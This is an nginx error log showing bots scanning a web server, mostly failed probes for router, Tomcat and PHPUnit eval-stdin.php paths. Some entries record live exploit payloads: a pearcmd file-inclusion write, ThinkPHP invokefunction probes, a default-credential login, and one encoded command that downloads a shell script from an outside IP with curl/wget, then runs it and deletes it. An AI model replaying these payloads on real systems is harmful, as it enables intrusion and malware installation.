2025/02/15 15:03:06 [error] 21#21: *613 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 135.148.213.254, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 15:22:41 [error] 21#21: *617 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 15:38:40 [error] 21#21: *619 open() "/assets/manager/text/list" failed (2: No such file or directory), client: 13.64.192.68, server: , request: "GET /manager/text/list HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 16:10:44 [error] 21#21: *621 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 17:00:37 [error] 21#21: *623 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 19:10:12 [error] 22#22: *638 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 5.135.238.149, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 19:22:29 [error] 22#22: *641 open() "/assets/index.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 19:22:29 [error] 22#22: *641 open() "/assets/index.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 19:22:29 [error] 22#22: *641 open() "/assets/index.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=cd%20%2ftmp%20%7c%7c%20cd%20%2fvar%2ftmp%20%7c%7c%20cd%20%2fdev%2fshm%3b%20curl%20-O%20http%3a%2f%2f196.251.115.173%2fsh%20%7c%7c%20wget%20http%3a%2f196.251.115.173%2fsh%3b%20chmod%20%2bx%20sh%3b%20.%2fsh%20thinkphp%3b%20rm%20-rf%20sh HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 19:22:29 [error] 22#22: *641 open() "/assets/index.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 19:22:29 [error] 22#22: *641 open() "/assets/public/index.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 19:44:48 [error] 22#22: *643 open() "/assets/hudson" failed (2: No such file or directory), client: 40.118.208.150, server: , request: "GET /hudson HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 20:53:33 [error] 19#19: *650 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 21:27:23 [error] 19#19: *653 open() "/assets/actuator/gateway/routes" failed (2: No such file or directory), client: 92.255.57.58, server: , request: "GET /actuator/gateway/routes HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 21:41:07 [error] 19#19: *656 "/assets/HNAP1/index.html" is not found (2: No such file or directory), client: 5.252.155.142, server: , request: "GET /HNAP1/ HTTP/1.1", host: "193.93.76.135:8080", referrer: "http://193.93.76.135:8080/"
2025/02/15 21:41:13 [error] 19#19: *657 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 22:22:16 [error] 19#19: *659 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 23:11:57 [error] 20#20: *663 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/15 23:54:38 [error] 20#20: *665 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 00:40:42 [error] 20#20: *671 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 120.39.36.62, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 00:44:01 [error] 20#20: *672 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 01:38:22 [error] 20#20: *673 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 02:01:03 [error] 21#21: *678 "/assets/download/powershell/index.html" is not found (2: No such file or directory), client: 192.241.169.176, server: , request: "GET /download/powershell/ HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 02:01:03 [error] 21#21: *679 open() "/assets/get.php" failed (2: No such file or directory), client: 192.241.169.176, server: , request: "GET /get.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 02:30:22 [error] 21#21: *683 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 02:38:12 [error] 21#21: *685 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 111.7.106.107, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 02:40:34 [error] 21#21: *688 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 23.145.40.147, server: , request: "GET /favicon.ico HTTP/1.1", host: "panel.test.rentall.in.ua:8080"
2025/02/16 03:19:48 [error] 21#21: *692 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 04:03:43 [error] 22#22: *695 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 04:52:06 [error] 22#22: *697 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 05:41:10 [error] 19#19: *713 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 06:57:10 [error] 19#19: *720 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 157.245.212.20, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135", referrer: "http://193.93.76.135:8080/"
2025/02/16 07:23:18 [error] 19#19: *722 open() "/assets/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.255.166.90, server: , request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:01:38 [error] 20#20: *725 open() "/assets/favicon.ico" failed (2: No such file or directory), client: 1.41.149.61, server: , request: "GET /favicon.ico HTTP/1.1", host: "193.93.76.135:8080", referrer: "http://193.93.76.135:8080/"
2025/02/16 08:19:58 [error] 20#20: *727 open() "/assets/boaform/admin/formLogin" failed (2: No such file or directory), client: 117.209.29.137, server: , request: "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0"
2025/02/16 08:24:38 [error] 20#20: *728 open() "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:24:41 [error] 20#20: *728 open() "/assets/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:24:44 [error] 20#20: *728 open() "/assets/vendor/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:24:47 [error] 20#20: *728 open() "/assets/vendor/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:24:50 [error] 20#20: *728 open() "/assets/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:24:53 [error] 20#20: *728 open() "/assets/vendor/phpunit/phpunit/LICENSE/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:24:56 [error] 20#20: *728 open() "/assets/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:24:59 [error] 20#20: *728 open() "/assets/lib/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:03 [error] 20#20: *728 open() "/assets/lib/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:06 [error] 20#20: *728 open() "/assets/lib/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:09 [error] 20#20: *728 open() "/assets/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:12 [error] 20#20: *728 open() "/assets/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:15 [error] 20#20: *728 open() "/assets/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:18 [error] 20#20: *728 open() "/assets/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:22 [error] 20#20: *728 open() "/assets/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:25 [error] 20#20: *728 open() "/assets/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:28 [error] 20#20: *728 open() "/assets/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:31 [error] 20#20: *728 open() "/assets/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:34 [error] 20#20: *728 open() "/assets/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:37 [error] 20#20: *728 open() "/assets/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:41 [error] 20#20: *728 open() "/assets/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:44 [error] 20#20: *728 open() "/assets/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:48 [error] 20#20: *728 open() "/assets/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:51 [error] 20#20: *728 open() "/assets/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:54 [error] 20#20: *728 open() "/assets/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:25:57 [error] 20#20: *728 open() "/assets/all/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /all/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:00 [error] 20#20: *728 open() "/assets/advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:03 [error] 20#20: *728 open() "/assets/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:06 [error] 20#20: *728 open() "/assets/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:09 [error] 20#20: *728 open() "/assets/back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:12 [error] 20#20: *728 open() "/assets/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:15 [error] 20#20: *728 open() "/assets/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:18 [error] 20#20: *728 open() "/assets/beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:21 [error] 20#20: *728 open() "/assets/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:24 [error] 20#20: *728 open() "/assets/blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:27 [error] 20#20: *728 open() "/assets/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:30 [error] 20#20: *728 open() "/assets/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:33 [error] 20#20: *728 open() "/assets/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:36 [error] 20#20: *728 open() "/assets/core/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /core/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:39 [error] 20#20: *728 open() "/assets/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:42 [error] 20#20: *728 open() "/assets/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:45 [error] 20#20: *728 open() "/assets/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:48 [error] 20#20: *728 open() "/assets/develop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /develop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:51 [error] 20#20: *728 open() "/assets/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:54 [error] 20#20: *728 open() "/assets/ecc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /ecc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:26:57 [error] 20#20: *728 open() "/assets/git/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /git/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:00 [error] 20#20: *728 open() "/assets/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:03 [error] 20#20: *728 open() "/assets/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:06 [error] 20#20: *728 open() "/assets/laravel_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /laravel_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:09 [error] 20#20: *728 open() "/assets/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:12 [error] 20#20: *728 open() "/assets/live/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /live/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:15 [error] 20#20: *728 open() "/assets/local/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /local/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:18 [error] 20#20: *728 open() "/assets/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:21 [error] 20#20: *728 open() "/assets/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:24 [error] 20#20: *728 open() "/assets/old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:27 [error] 20#20: *728 open() "/assets/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:30 [error] 20#20: *728 open() "/assets/pid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /pid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:34 [error] 20#20: *728 open() "/assets/pkm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /pkm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:37 [error] 20#20: *728 open() "/assets/pms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /pms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:40 [error] 20#20: *728 open() "/assets/portal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /portal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:43 [error] 20#20: *728 open() "/assets/pos/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /pos/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:46 [error] 20#20: *728 open() "/assets/pos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /pos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
2025/02/16 08:27:49 [error] 20#20: *728 open() "/assets/production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 185.93.89.118, server: , request: "GET /production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "193.93.76.135:8080"
